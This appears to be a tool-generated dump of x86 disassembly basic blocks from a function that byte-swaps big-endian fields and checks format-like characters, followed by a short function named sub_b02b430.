|
|
|
v
0xb029de8:	mov	dword ptr [esp], edx
0xb029deb:	mov	dword ptr [esp + 4], 0
0xb029df3:	call	0xb0daada
None
|
|
|
v
0xb02abda:	mov	eax, dword ptr [ebp - 0xa8]
0xb02abe0:	mov	dword ptr [esp], esi
0xb02abe3:	mov	dword ptr [esp + 4], eax
0xb02abe7:	call	0xb0e7410
None
|
|
|
v
0xb02b2b3:	cmp	al, 0x58
0xb02b2b5:	jne	0xb02acd2
None
|
|
|
v
0xb02b335:	cmp	byte ptr [ebp - 0xc0], 0
0xb02b33c:	jne	0xb02b39b
None
|
|
|
v
0xb02b23a:	lea	esi, dword ptr [ebx - 0x4a959]
0xb02b240:	jmp	0xb02a253
None
|
|
|
v
0xb02b410:	lea	ecx, dword ptr [ebx + 0x1184]
0xb02b416:	call	0xb0f9430
None
|
|
|
v
0xb02b42b:	jmp	0xb029dc5
None
|
|
|
v
0xb02b34d:	cmp	al, 0x78
0xb02b34f:	je	0xb02b37a
None
|
|
|
v
0xb029f80:	mov	eax, dword ptr [ebp - 0xa8]
0xb029f86:	mov	dword ptr [esp], esi
0xb029f89:	mov	dword ptr [esp + 4], eax
0xb029f8d:	call	0xb0e7410
None
|
|
|
v
0xb02aed2:	cmp	al, 0x78
0xb02aed4:	je	0xb02b22f
None
|
|
|
v
0xb02b1d0:	xor	esi, esi
0xb02b1d2:	jmp	0xb02a253
None
|
|
|
v
0xb02a3ac:	mov	eax, dword ptr [ebp - 0x90]
0xb02a3b2:	test	eax, eax
0xb02a3b4:	je	0xb02a771
None
|
|
|
v
0xb02b136:	lea	esi, dword ptr [ebx - 0x49654]
0xb02b13c:	jmp	0xb02a253
None
|
|
|
v
0xb02ae38:	mov	edx, esi
0xb02ae3a:	cmp	dl, 0x46
0xb02ae3d:	jne	0xb02aef1
None
|
|
|
v
0xb02a4e9:	add	dword ptr [ebp - 0xac], 1
0xb02a4f0:	mov	eax, dword ptr [ebp - 0xb4]
0xb02a4f6:	cmp	dword ptr [ebp - 0xac], eax
0xb02a4fc:	jb	0xb02a409
None
|
|
|
v
0xb02aca4:	cmp	eax, 0xde120495
0xb02aca9:	je	0xb02ac26
None
|
|
|
v
0xb02b0eb:	cmp	byte ptr [eax + 0xb], 0
0xb02b0ef:	jne	0xb02a253
None
|
|
|
v
0xb02a81b:	mov	esi, dword ptr [ebp - 0xa0]
0xb02a821:	mov	dword ptr [ebp - 0x9c], 0
0xb02a82b:	mov	dword ptr [ebp - 0xa0], esi
0xb02a831:	mov	dword ptr [ebp - 0xac], edi
0xb02a837:	mov	edi, dword ptr [ebp - 0x9c]
0xb02a83d:	mov	eax, dword ptr [ebp - 0xd0]
0xb02a843:	mov	eax, dword ptr [eax + edi*8 + 4]
0xb02a847:	mov	dword ptr [esp], eax
0xb02a84a:	call	0xb02ce10
None
|
|
|
v
0xb02afc6:	lea	esi, dword ptr [ebx - 0x49654]
0xb02afcc:	jmp	0xb02a253
None
|
|
|
v
0xb02b0e1:	cmp	byte ptr [eax + 0xa], 0x36
0xb02b0e5:	jne	0xb02a253
None
|
|
|
v
0xb02aff9:	lea	esi, dword ptr [ebx - 0x4a961]
0xb02afff:	jmp	0xb02a253
None
|
|
|
v
0xb02a2a6:	movzx	edx, byte ptr [eax + 3]
0xb02a2aa:	cmp	dl, 0x64
0xb02a2ad:	mov	byte ptr [ebp - 0xbc], dl
0xb02a2b3:	sete	dl
0xb02a2b6:	cmp	byte ptr [ebp - 0xbc], 0x69
0xb02a2bd:	mov	byte ptr [ebp - 0xc4], dl
0xb02a2c3:	sete	byte ptr [ebp - 0xc0]
0xb02a2ca:	test	dl, dl
0xb02a2cc:	jne	0xb02a2f4
None
|
|
|
v
0xb02b3b1:	xor	esi, esi
0xb02b3b3:	jmp	0xb02a253
None
|
|
|
v
0xb02aebb:	movzx	eax, byte ptr [ebp - 0xbc]
0xb02aec2:	cmp	al, 0x6f
0xb02aec4:	je	0xb02b245
None
|
|
|
v
0xb02aaef:	cmp	byte ptr [eax + 6], 0
0xb02aaf3:	jne	0xb02a253
None
|
|
|
v
0xb02aa59:	cmp	al, 0x58
0xb02aa5b:	nop	
0xb02aa5c:	lea	esi, dword ptr [esi]
0xb02aa60:	jne	0xb02acd2
None
|
|
|
v
0xb02b1ba:	lea	esi, dword ptr [ebx - 0x47075]
0xb02b1c0:	jmp	0xb02a253
None
|
|
|
v
0xb029fca:	mov	eax, dword ptr [ebp - 0xa8]
0xb029fd0:	mov	dword ptr [ebp - 0x90], edx
0xb029fd6:	mov	dword ptr [esp], eax
0xb029fd9:	call	0xb0173f0
None
|
|
|
v
0xb02ab90:	lea	esi, dword ptr [ebx - 0x49654]
0xb02ab96:	jmp	0xb02a253
None
|
|
|
v
0xb02aa9f:	movzx	eax, byte ptr [ebp - 0xbc]
0xb02aaa6:	cmp	al, 0x6f
0xb02aaa8:	je	0xb02ac47
None
|
|
|
v
0xb02b349:	cmp	al, 0x75
0xb02b34b:	je	0xb02b385
None
|
|
|
v
0xb02adcc:	cmp	dl, 0x36
0xb02adcf:	jne	0xb02a253
None
|
|
|
v
0xb02a4d0:	mov	eax, dword ptr [ebp - 0xbc]
0xb02a4d6:	add	eax, dword ptr [ebp - 0x7c]
0xb02a4d9:	add	dword ptr [ebp - 0xc0], 1
0xb02a4e0:	add	eax, dword ptr [ebp - 0x80]
0xb02a4e3:	mov	dword ptr [ebp - 0xbc], eax
0xb02a4e9:	add	dword ptr [ebp - 0xac], 1
0xb02a4f0:	mov	eax, dword ptr [ebp - 0xb4]
0xb02a4f6:	cmp	dword ptr [ebp - 0xac], eax
0xb02a4fc:	jb	0xb02a409
None
|
|
|
v
0xb02b20e:	lea	esi, dword ptr [ebx - 0x490fa]
0xb02b214:	jmp	0xb02a253
None
|
|
|
v
0xb02afbc:	cmp	al, 0x58
0xb02afbe:	nop	
0xb02afc0:	jne	0xb02acd2
None
|
|
|
v
0xb02b2c6:	cmp	byte ptr [eax + 9], 0x36
0xb02b2ca:	jne	0xb02a253
None
|
|
|
v
0xb02a821:	mov	dword ptr [ebp - 0x9c], 0
0xb02a82b:	mov	dword ptr [ebp - 0xa0], esi
0xb02a831:	mov	dword ptr [ebp - 0xac], edi
0xb02a837:	mov	edi, dword ptr [ebp - 0x9c]
0xb02a83d:	mov	eax, dword ptr [ebp - 0xd0]
0xb02a843:	mov	eax, dword ptr [eax + edi*8 + 4]
0xb02a847:	mov	dword ptr [esp], eax
0xb02a84a:	call	0xb02ce10
None
|
|
|
v
0xb029e03:	lea	eax, dword ptr [ebp - 0x78]
0xb029e06:	mov	dword ptr [esp + 4], edx
0xb029e0a:	mov	dword ptr [esp + 8], eax
0xb029e0e:	mov	dword ptr [esp], 3
0xb029e15:	mov	dword ptr [ebp - 0x90], edx
0xb029e1b:	call	0xb0da2f0
None
|
|
|
v
0xb029f15:	mov	ecx, dword ptr [ebp - 0x90]
0xb029f1b:	mov	edx, dword ptr [esi + 8]
0xb029f1e:	test	ecx, ecx
0xb029f20:	je	0xb02a070
None
|
|
|
v
0xb02adb8:	xor	esi, esi
0xb02adba:	cmp	dl, 0x31
0xb02adbd:	je	0xb02b0e1
None
|
|
|
v
0xb02a4b0:	xor	esi, esi
0xb02a4b2:	mov	eax, dword ptr [ebp - 0x98]
0xb02a4b8:	add	dword ptr [ebp - 0x98], 1
0xb02a4bf:	cmp	dword ptr [ebp - 0x98], 2
0xb02a4c6:	mov	dword ptr [ebp + eax*4 - 0x80], esi
0xb02a4ca:	jne	0xb02a413
None
|
|
|
v
0xb02b270:	cmp	byte ptr [eax + 0xa], 0
0xb02b274:	jne	0xb02a253
None
|
|
|
v
0xb02ac3c:	lea	esi, dword ptr [ebx - 0x47eb9]
0xb02ac42:	jmp	0xb02a253
None
|
|
|
v
0xb02a532:	test	eax, eax
0xb02a534:	mov	dword ptr [ebp - 0xd0], eax
0xb02a53a:	je	0xb02a396
None
|
|
|
v
0xb02b11e:	cmp	al, 0x75
0xb02b120:	je	0xb02b1d7
None
|
|
|
v
0xb02a2d7:	movzx	edx, byte ptr [ebp - 0xbc]
0xb02a2de:	cmp	dl, 0x6f
0xb02a2e1:	je	0xb02a2f4
None
|
|
|
v
0xb02b359:	lea	esi, dword ptr [ebx - 0x49654]
0xb02b35f:	jmp	0xb02a253
None
|
|
|
v
0xb02b01a:	lea	esi, dword ptr [ebx - 0x47eb9]
0xb02b020:	jmp	0xb02a253
None
|
|
|
v
0xb02a4a0:	add	eax, dword ptr [edi]
0xb02a4a2:	mov	esi, eax
0xb02a4a4:	mov	eax, dword ptr [edi + 4]
0xb02a4a7:	jmp	0xb02a46b
None
|
|
|
v
0xb02b3a6:	lea	esi, dword ptr [ebx - 0x4a842]
0xb02b3ac:	jmp	0xb02a253
None
|
|
|
v
0xb02a1bf:	mov	ecx, dword ptr [ebp - 0x9c]
0xb02a1c5:	lea	edx, dword ptr [ecx*4 + 0x1e]
0xb02a1cc:	lea	ecx, dword ptr [esi + eax]
0xb02a1cf:	and	edx, 0xfffffff0
0xb02a1d2:	lea	eax, dword ptr [ebx - 0x47531]
0xb02a1d8:	sub	esp, edx
0xb02a1da:	mov	dword ptr [ebp - 0xac], eax
0xb02a1e0:	mov	eax, dword ptr [ebp - 0x9c]
0xb02a1e6:	lea	edx, dword ptr [esp + 0x27]
0xb02a1ea:	and	edx, 0xfffffff0
0xb02a1ed:	mov	dword ptr [ebp - 0xa0], edx
0xb02a1f3:	xor	edx, edx
0xb02a1f5:	test	eax, eax
0xb02a1f7:	je	0xb02a3ac
None
|
|
|
v
0xb02ae22:	cmp	al, 0x58
0xb02ae24:	jne	0xb02acd2
None
|
|
|
v
0xb02a604:	add	ecx, 1
0xb02a607:	cmp	ecx, 2
0xb02a60a:	jne	0xb02a5a1
None
|
|
|
v
0xb02aeae:	cmp	byte ptr [ebp - 0xc0], 0
0xb02aeb5:	jne	0xb02b250
None
|
|
|
v
0xb02b046:	lea	esi, dword ptr [ebx - 0x4a95d]
0xb02b04c:	jmp	0xb02a253
None
|
|
|
v
0xb02a42f:	mov	eax, dword ptr [ebp - 0xb8]
0xb02a435:	mov	edi, dword ptr [ebp - 0xac]
0xb02a43b:	mov	edx, dword ptr [eax + edi*4]
0xb02a43e:	bswap	edx
0xb02a440:	add	edx, dword ptr [ebp - 0xb0]
0xb02a446:	mov	eax, dword ptr [edx + 8]
0xb02a449:	bswap	eax
0xb02a44b:	cmp	eax, 0xff
0xb02a44e:	setne	al
0xb02a451:	test	al, al
0xb02a453:	je	0xb02a4b0
None
|
|
|
v
0xb02b27a:	cmp	byte ptr [ebp - 0xc4], 0
0xb02b281:	jne	0xb02b405
None
|
|
|
v
0xb02abb1:	lea	esi, dword ptr [ebx - 0x490fa]
0xb02abb7:	jmp	0xb02a253
None
|
|
|
v
0xb02a421:	mov	esi, dword ptr [ebp - 0x98]
0xb02a427:	test	esi, esi
0xb02a429:	je	0xb02ac68
None
|
|
|
v
0xb02aaf9:	cmp	byte ptr [ebp - 0xc4], 0
0xb02ab00:	jne	0xb02ad6b
None
|
|
|
v
0xb02ada1:	cmp	byte ptr [eax + 8], 0x54
0xb02ada5:	jne	0xb02a253
None
|
|
|
v
0xb02a210:	mov	eax, dword ptr [ecx + 4]
0xb02a213:	mov	esi, dword ptr [ecx]
0xb02a215:	bswap	eax
0xb02a217:	add	eax, edi
0xb02a219:	bswap	esi
0xb02a21b:	test	esi, esi
0xb02a21d:	je	0xb02a380
None
|
|
|
v
0xb02ac26:	mov	dword ptr [ebp - 0xa4], 0
0xb02ac30:	jmp	0xb029ebd
None
|
|
|
v
0xb02b18e:	lea	esi, dword ptr [ebx - 0x47955]
0xb02b194:	jmp	0xb02a253
None
|
|
|
v
0xb02b030:	lea	esi, dword ptr [ebx - 0x47075]
0xb02b036:	jmp	0xb02a253
None
|
|
|
v
0xb02a22e:	movzx	esi, byte ptr [eax]
0xb02a231:	mov	edx, esi
0xb02a233:	cmp	dl, 0x50
0xb02a236:	je	0xb02a298
None
|
|
|
v
0xb02b1d7:	lea	esi, dword ptr [ebx - 0x47eb9]
0xb02b1dd:	jmp	0xb02a253
None
|
|
|
v
0xb029f92:	mov	eax, dword ptr [ebp - 0x94]
0xb029f98:	mov	dword ptr [esp], eax
0xb029f9b:	call	0xb017470
None
|
|
|
v
0xb029f0e:	cmp	eax, 0x1ffff
0xb029f13:	ja	0xb029f68
None
|
|
|
v
0xb02b37a:	lea	esi, dword ptr [ebx - 0x47955]
0xb02b380:	jmp	0xb02a253
None
|
|
|
v
0xb02a360:	test	eax, eax
0xb02a362:	mov	dword ptr [ebp - 0xb4], eax
0xb02a368:	je	0xb02a340
None
|
|
|
v
0xb02ab9b:	lea	esi, dword ptr [ebx - 0x47955]
0xb02aba1:	jmp	0xb02a253
None
|
|
|
v
0xb02a3cc:	add	eax, esi
0xb02a3ce:	mov	dword ptr [ebp - 0xb8], eax
0xb02a3d4:	mov	eax, dword ptr [ebp - 0xb0]
0xb02a3da:	mov	dword ptr [ebp - 0xac], 0
0xb02a3e4:	mov	dword ptr [ebp - 0xc0], 0
0xb02a3ee:	mov	dword ptr [ebp - 0xb0], esi
0xb02a3f4:	shl	eax, 2
0xb02a3f7:	mov	dword ptr [ebp - 0xcc], eax
0xb02a3fd:	mov	dword ptr [ebp - 0xbc], eax
0xb02a403:	mov	dword ptr [ebp - 0xc4], edi
0xb02a409:	mov	dword ptr [ebp - 0x98], 0
0xb02a413:	mov	edi, dword ptr [ebp - 0x90]
0xb02a419:	test	edi, edi
0xb02a41b:	je	0xb02a728
None
|
|
|
v
0xb02abbc:	lea	esi, dword ptr [ebx - 0x47075]
0xb02abc2:	jmp	0xb02a253
None
|
|
|
v
0xb02a728:	mov	ecx, dword ptr [ebp - 0x98]
0xb02a72e:	test	ecx, ecx
0xb02a730:	je	0xb02ac90
None
|
|
|
v
0xb02ac5d:	lea	esi, dword ptr [ebx - 0x4a842]
0xb02ac63:	jmp	0xb02a253
None
|
|
|
v
0xb02a596:	mov	eax, dword ptr [ebp - 0x94]
0xb02a59c:	xor	ecx, ecx
0xb02a59e:	mov	edi, dword ptr [eax + 0xc]
0xb02a5a1:	test	edi, edi
0xb02a5a3:	je	0xb02a921
None
|
|
|
v
0xb02a5f6:	test	edi, edi
0xb02a5f8:	mov	eax, dword ptr [edx + 4]
0xb02a5fb:	je	0xb02a5ff
None
|
|
|
v
0xb02a9b8:	mov	eax, dword ptr [ebp - 0xac]
0xb02a9be:	mov	ecx, dword ptr [esi]
0xb02a9c0:	test	eax, eax
0xb02a9c2:	jne	0xb02a966
None
|
|
|
v
0xb02ae70:	xor	esi, esi
0xb02ae72:	cmp	dl, 0x31
0xb02ae75:	je	0xb02b2c6
None
|
|
|
v
0xb02a494:	add	eax, esi
0xb02a496:	mov	edx, dword ptr [ebp - 0x90]
0xb02a49c:	test	edx, edx
0xb02a49e:	jne	0xb02a460
None
|
|
|
v
0xb02ae43:	xor	esi, esi
0xb02ae45:	cmp	byte ptr [eax + 5], 0x41
0xb02ae49:	jne	0xb02a253
None
|
|
|
v
0xb02a489:	mov	dword ptr [esp], eax
0xb02a48c:	add	edi, 8
0xb02a48f:	call	0xb07ae80
None
|
|
|
v
0xb02b41b:	jmp	0xb029d7d
None
|
|
|
v
0xb02a1af:	mov	eax, dword ptr [esi + 0x1c]
0xb02a1b2:	bswap	eax
0xb02a1b4:	mov	dword ptr [ebp - 0x9c], eax
0xb02a1ba:	mov	eax, dword ptr [esi + 0x20]
0xb02a1bd:	bswap	eax
0xb02a1bf:	mov	ecx, dword ptr [ebp - 0x9c]
0xb02a1c5:	lea	edx, dword ptr [ecx*4 + 0x1e]
0xb02a1cc:	lea	ecx, dword ptr [esi + eax]
0xb02a1cf:	and	edx, 0xfffffff0
0xb02a1d2:	lea	eax, dword ptr [ebx - 0x47531]
0xb02a1d8:	sub	esp, edx
0xb02a1da:	mov	dword ptr [ebp - 0xac], eax
0xb02a1e0:	mov	eax, dword ptr [ebp - 0x9c]
0xb02a1e6:	lea	edx, dword ptr [esp + 0x27]
0xb02a1ea:	and	edx, 0xfffffff0
0xb02a1ed:	mov	dword ptr [ebp - 0xa0], edx
0xb02a1f3:	xor	edx, edx
0xb02a1f5:	test	eax, eax
0xb02a1f7:	je	0xb02a3ac
None
|
|
|
v
0xb02aa16:	cmp	byte ptr [eax + 5], 0
0xb02aa1a:	jne	0xb02a323
None
|
|
|
v
0xb02a1fd:	mov	dword ptr [ebp - 0xb8], edi
0xb02a203:	mov	edi, esi
0xb02a205:	mov	dword ptr [ebp - 0x98], edx
0xb02a20b:	jmp	0xb02a27e
None
|
|
|
v
0xb02aa51:	cmp	al, 0x78
0xb02aa53:	je	0xb02ab9b
None
|
|
|
v
0xb02a938:	add	edx, dword ptr [ebp - 0xcc]
0xb02a93e:	cmp	dword ptr [edx + 8], -1
0xb02a942:	setne	al
0xb02a945:	jmp	0xb02a5d3
None
|
|
|
v
0xb02a64d:	mov	eax, dword ptr [ebp - 0xb8]
0xb02a653:	mov	esi, dword ptr [ebp - 0xb0]
0xb02a659:	mov	eax, dword ptr [eax + esi*4]
0xb02a65c:	mov	esi, dword ptr [ebp - 0xcc]
0xb02a662:	bswap	eax
0xb02a664:	add	esi, eax
0xb02a666:	mov	eax, dword ptr [esi]
0xb02a668:	bswap	eax
0xb02a66a:	add	eax, dword ptr [ebp - 0xcc]
0xb02a670:	mov	dword ptr [ebp - 0xbc], eax
0xb02a676:	mov	eax, dword ptr [ebp - 0xc4]
0xb02a67c:	test	eax, eax
0xb02a67e:	mov	eax, dword ptr [ebp - 0xd0]
0xb02a684:	cmovne	eax, dword ptr [ebp - 0xdc]
0xb02a68b:	add	eax, dword ptr [ebp - 0xe0]
0xb02a691:	mov	dword ptr [ebp - 0xd4], eax
0xb02a697:	mov	eax, dword ptr [ebp - 0xac]
0xb02a69d:	test	eax, eax
0xb02a69f:	je	0xb02a94a
None
|
|
|
v
0xb02afd1:	xor	esi, esi
0xb02afd3:	jmp	0xb02a253
None
|
|
|
v
0xb02a133:	mov	esi, dword ptr [ebp - 0x94]
0xb02a139:	lea	ecx, dword ptr [esi + 0x64]
0xb02a13c:	lea	edx, dword ptr [esi + 0x60]
0xb02a13f:	call	0xb02cd20
None
|
|
|
v
0xb02a460:	mov	esi, dword ptr [edi]
0xb02a462:	bswap	esi
0xb02a464:	add	esi, eax
0xb02a466:	mov	eax, dword ptr [edi + 4]
0xb02a469:	bswap	eax
0xb02a46b:	cmp	eax, 0xff
0xb02a46e:	je	0xb02a4b2
None
|
|
|
v
0xb02a253:	mov	eax, dword ptr [ebp - 0xa0]
0xb02a259:	add	ecx, 8
0xb02a25c:	mov	edx, dword ptr [ebp - 0x98]
0xb02a262:	add	dword ptr [ebp - 0x98], 1
0xb02a269:	mov	dword ptr [eax + edx*4], esi
0xb02a26c:	mov	eax, dword ptr [ebp - 0x9c]
0xb02a272:	cmp	dword ptr [ebp - 0x98], eax
0xb02a278:	je	0xb02a3a4
None
|
|
|
v
0xb02ad2b:	mov	eax, dword ptr [ebp - 0xc8]
0xb02ad31:	mov	esi, dword ptr [ebp - 0xb0]
0xb02ad37:	mov	edx, dword ptr [eax + esi*4]
0xb02ad3a:	jmp	0xb02a938
None
|
|
|
v
0xb02b0d6:	lea	esi, dword ptr [ebx - 0x49654]
0xb02b0dc:	jmp	0xb02a253
None
|
|
|
v
0xb02a807:	mov	esi, dword ptr [ebp - 0x90]
0xb02a80d:	mov	dword ptr [esi + eax], edx
0xb02a810:	add	eax, 4
0xb02a813:	cmp	eax, dword ptr [ebp - 0x98]
0xb02a819:	jne	0xb02a7f8
None
|
|
|
v
0xb02b05c:	lea	esi, dword ptr [ebx - 0x4a961]
0xb02b062:	jmp	0xb02a253
None
|
|
|
v
0xb02ae63:	movzx	edx, byte ptr [eax + 8]
0xb02ae67:	cmp	dl, 0x38
0xb02ae6a:	je	0xb02b322
None
|
|
|
v
0xb02a27e:	mov	eax, dword ptr [ebp - 0x90]
0xb02a284:	test	eax, eax
0xb02a286:	jne	0xb02a210
None
|
|
|
v
0xb02b2bb:	lea	esi, dword ptr [ebx - 0x49654]
0xb02b2c1:	jmp	0xb02a253
None
|
|
|
v
0xb02a409:	mov	dword ptr [ebp - 0x98], 0
0xb02a413:	mov	edi, dword ptr [ebp - 0x90]
0xb02a419:	test	edi, edi
0xb02a41b:	je	0xb02a728
None
|
|
|
v
0xb02a00c:	add	dword ptr [ebp - 0x90], eax
0xb02a012:	sub	esi, eax
0xb02a014:	je	0xb02abf8
None
|
|
|
v
0xb02a9c9:	mov	eax, dword ptr [ebp - 0xbc]
0xb02a9cf:	mov	dword ptr [esp + 8], ecx
0xb02a9d3:	mov	dword ptr [esp], edi
0xb02a9d6:	mov	dword ptr [ebp - 0x9c], edx
0xb02a9dc:	mov	dword ptr [esp + 4], eax
0xb02a9e0:	mov	dword ptr [ebp - 0x98], ecx
0xb02a9e6:	call	0xb07d0b0
None
|
|
|
v
0xb02a43e:	bswap	edx
0xb02a440:	add	edx, dword ptr [ebp - 0xb0]
0xb02a446:	mov	eax, dword ptr [edx + 8]
0xb02a449:	bswap	eax
0xb02a44b:	cmp	eax, 0xff
0xb02a44e:	setne	al
0xb02a451:	test	al, al
0xb02a453:	je	0xb02a4b0
None
|
|
|
v
0xb02b3c3:	lea	esi, dword ptr [ebx - 0x490fa]
0xb02b3c9:	jmp	0xb02a253
None
|
|
|
v
0xb02b203:	lea	esi, dword ptr [ebx - 0x47eb9]
0xb02b209:	jmp	0xb02a253
None
|
|
|
v
0xb02a757:	mov	eax, dword ptr [ebp - 0x94]
0xb02a75d:	mov	esi, dword ptr [ebp - 0xb0]
0xb02a763:	mov	edi, dword ptr [ebp - 0xc4]
0xb02a769:	mov	eax, dword ptr [eax + 0x10]
0xb02a76c:	jmp	0xb029f6a
None
|
|
|
v
0xb02a243:	cmp	byte ptr [eax + 1], 0
0xb02a247:	mov	esi, 0
0xb02a24c:	cmove	esi, dword ptr [ebp - 0xac]
0xb02a253:	mov	eax, dword ptr [ebp - 0xa0]
0xb02a259:	add	ecx, 8
0xb02a25c:	mov	edx, dword ptr [ebp - 0x98]
0xb02a262:	add	dword ptr [ebp - 0x98], 1
0xb02a269:	mov	dword ptr [eax + edx*4], esi
0xb02a26c:	mov	eax, dword ptr [ebp - 0x9c]
0xb02a272:	cmp	dword ptr [ebp - 0x98], eax
0xb02a278:	je	0xb02a3a4
None
|
|
|
v
0xb02b2a3:	cmp	al, 0x75
0xb02b2a5:	je	0xb02b3e4
None
|
|
|
v
0xb029d83:	mov	edx, dword ptr [ebx + 0x1188]
0xb029d89:	mov	ecx, dword ptr [edi + 4]
0xb029d8c:	lea	eax, dword ptr [edx + 1]
0xb029d8f:	test	ecx, ecx
0xb029d91:	mov	dword ptr [ebx + 0x1188], eax
0xb029d97:	je	0xb029dd0
None
|
|
|
v
0xb02b0ca:	cmp	al, 0x58
0xb02b0cc:	lea	esi, dword ptr [esi]
0xb02b0d0:	jne	0xb02acd2
None
|
|
|
v
0xb02a153:	lea	ecx, dword ptr [edx + esi]
0xb02a156:	mov	dword ptr [ebp - 0x98], ecx
0xb02a15c:	jmp	0xb02a0a8
None
|
|
|
v
0xb02b154:	cmp	byte ptr [ebp - 0xc0], 0
0xb02b15b:	jne	0xb02b1ba
None
|
|
|
v
0xb02ab06:	cmp	byte ptr [ebp - 0xc0], 0
0xb02ab0d:	jne	0xb02ad60
None
|
|
|
v
0xb02acb7:	jmp	0xb029fa7
None
|
|
|
v
0xb02a46b:	cmp	eax, 0xff
0xb02a46e:	je	0xb02a4b2
None
|
|
|
v
0xb02aa04:	mov	esi, dword ptr [ebp - 0xd4]
0xb02aa0a:	mov	eax, edi
0xb02aa0c:	sub	eax, dword ptr [esi + 4]
0xb02aa0f:	mov	dword ptr [esi], eax
0xb02aa11:	jmp	0xb02a6c9
None
|
|
|
v
0xb02b266:	cmp	byte ptr [eax + 9], 0x32
0xb02b26a:	jne	0xb02a253
None
|
|
|
v
0xb02a5a1:	test	edi, edi
0xb02a5a3:	je	0xb02a921
None
|
|
|
v
0xb02ae12:	cmp	al, 0x75
0xb02ae14:	je	0xb02b051
None
|
|
|
v
0xb02aa2d:	cmp	byte ptr [ebp - 0xc0], 0
0xb02aa34:	jne	0xb02abbc
None
|
|
|
v
0xb02a2e8:	and	edx, 0xffffffdf
0xb02a2eb:	cmp	dl, 0x58
0xb02a2ee:	jne	0xb02a253
None
|
|
|
v
0xb02a223:	cmp	byte ptr [eax + esi - 1], 0
0xb02a228:	jne	0xb02a380
None
|
|
|
v
0xb02afb8:	cmp	al, 0x78
0xb02afba:	je	0xb02afe3
None
|
|
|
v
0xb029fe8:	mov	ecx, dword ptr [ebp - 0xa8]
0xb029fee:	mov	dword ptr [ebp - 0x94], edi
0xb029ff4:	mov	edi, edx
0xb029ff6:	mov	dword ptr [ebp - 0x90], eax
0xb029ffc:	mov	dword ptr [ebp - 0x98], eax
0xb02a002:	mov	esi, ecx
0xb02a004:	jmp	0xb02a01a
None
|
|
|
v
0xb02a805:	bswap	edx
0xb02a807:	mov	esi, dword ptr [ebp - 0x90]
0xb02a80d:	mov	dword ptr [esi + eax], edx
0xb02a810:	add	eax, 4
0xb02a813:	cmp	eax, dword ptr [ebp - 0x98]
0xb02a819:	jne	0xb02a7f8
None
|
|
|
v
0xb02ab32:	cmp	al, 0x58
0xb02ab34:	jne	0xb02acd2
None
|
|
|
v
0xb029e4b:	mov	dword ptr [esp + 0x10], edx
0xb029e4f:	mov	dword ptr [esp + 0x14], 0
0xb029e57:	mov	dword ptr [esp + 0xc], 2
0xb029e5f:	mov	dword ptr [esp + 8], 1
0xb029e67:	mov	dword ptr [esp + 4], eax
0xb029e6b:	mov	dword ptr [esp], 0
0xb029e72:	call	0xb0e7320
None
|
|
|
v
0xb02b3ce:	lea	esi, dword ptr [ebx - 0x47075]
0xb02b3d4:	jmp	0xb02a253
None
|
|
|
v
0xb02b219:	lea	esi, dword ptr [ebx - 0x47075]
0xb02b21f:	jmp	0xb02a253
None
|
|
|
v
0xb02a7c8:	mov	eax, dword ptr [ebp - 0x94]
0xb02a7ce:	mov	eax, dword ptr [eax + 0x2c]
0xb02a7d1:	test	eax, eax
0xb02a7d3:	je	0xb02a821
None
|
|
|
v
0xb02ae97:	cmp	byte ptr [eax + 0xa], 0
0xb02ae9b:	jne	0xb02a253
None
|
|
|
v
0xb02aef8:	xor	esi, esi
0xb02aefa:	cmp	byte ptr [eax + 5], 0x41
0xb02aefe:	jne	0xb02a253
None
|
|
|
v
0xb02afb4:	cmp	al, 0x75
0xb02afb6:	je	0xb02b01a
None
|
|
|
v
0xb02ae8d:	cmp	byte ptr [eax + 9], 0x34
0xb02ae91:	jne	0xb02a253
None
|
|
|
v
0xb02aeca:	cmp	al, 0x75
0xb02aecc:	je	0xb02b23a
None
|
|
|
v
0xb029d7d:	mov	dword ptr [ebx + 0x118c], edx
0xb029d83:	mov	edx, dword ptr [ebx + 0x1188]
0xb029d89:	mov	ecx, dword ptr [edi + 4]
0xb029d8c:	lea	eax, dword ptr [edx + 1]
0xb029d8f:	test	ecx, ecx
0xb029d91:	mov	dword ptr [ebx + 0x1188], eax
0xb029d97:	je	0xb029dd0
None
|
|
|
v
0xb02a6fa:	mov	eax, dword ptr [ebp - 0xc4]
0xb02a700:	test	eax, eax
0xb02a702:	je	0xb02ac7c
None
|
|
|
v
0xb02a5b1:	mov	eax, dword ptr [ebp - 0xb8]
0xb02a5b7:	mov	esi, dword ptr [ebp - 0xb0]
0xb02a5bd:	mov	edx, dword ptr [eax + esi*4]
0xb02a5c0:	bswap	edx
0xb02a5c2:	add	edx, dword ptr [ebp - 0xcc]
0xb02a5c8:	mov	eax, dword ptr [edx + 8]
0xb02a5cb:	bswap	eax
0xb02a5cd:	cmp	eax, 0xff
0xb02a5d0:	setne	al
0xb02a5d3:	test	al, al
0xb02a5d5:	je	0xb02a604
None
|
|
|
v
0xb029e42:	cmp	eax, 0x2f
0xb029e45:	jbe	0xb02a04f
None
|
|
|
v
0xb02b322:	cmp	byte ptr [eax + 9], 0
0xb02b326:	jne	0xb02b3b1
None
|
|
|
v
0xb02aa71:	cmp	byte ptr [eax + 5], 0x36
0xb02aa75:	jne	0xb02a323
None
|
|
|
v
0xb02a8b1:	mov	eax, dword ptr [ebp - 0x94]
0xb02a8b7:	mov	edi, dword ptr [ebp - 0x9c]
0xb02a8bd:	add	dword ptr [ebp - 0x9c], 1
0xb02a8c4:	mov	eax, dword ptr [eax + 0x14]
0xb02a8c7:	lea	eax, dword ptr [edi + eax + 1]
0xb02a8cb:	mov	dword ptr [edx], eax
0xb02a8cd:	mov	eax, dword ptr [ebp - 0x9c]
0xb02a8d3:	cmp	eax, dword ptr [ebp - 0xc0]
0xb02a8d9:	jne	0xb02a837
None
|
|
|
v
0xb02b224:	lea	esi, dword ptr [ebx - 0x4a842]
0xb02b22a:	jmp	0xb02a253
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b02b430
TOTAL BLOCKS :3
0xb02b436:	add	ebx, 0x17fbca
0xb02b43c:	sub	esp, 0x18
0xb02b43f:	lea	eax, dword ptr [ebx - 0xfc0]
0xb02b445:	mov	dword ptr [esp + 8], eax
0xb02b449:	mov	eax, dword ptr [esp + 0x24]
0xb02b44d:	mov	eax, dword ptr [eax]
0xb02b44f:	mov	dword ptr [esp + 4], eax
0xb02b453:	mov	eax, dword ptr [esp + 0x20]
0xb02b457:	mov	eax, dword ptr [eax]
0xb02b459:	mov	dword ptr [esp], eax
0xb02b45c:	call	0xb094e70
None
|
|
|
v
0xb02b430:	push	ebx
0xb02b431:	call	0xb1267db
None
|
|
|
